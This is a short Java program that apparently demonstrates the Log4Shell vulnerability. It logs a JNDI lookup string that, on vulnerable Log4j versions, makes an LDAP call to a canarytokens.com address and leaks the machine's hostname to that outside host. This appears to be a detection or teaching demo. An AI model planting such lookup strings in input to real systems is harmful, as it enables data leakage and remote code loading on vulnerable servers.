package log4JDemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4ShellDemo {
	static Logger log = LogManager.getLogger("VulnerableHandler");

	public static void main(String[] args) {
		log.error("Hello this is a debug message");
		log.error("${jndi:ldap://x${hostName}.L4J.3b9pjgih4u3p2uyy6pjnv94bv.canarytokens.com/a}");
	}
}
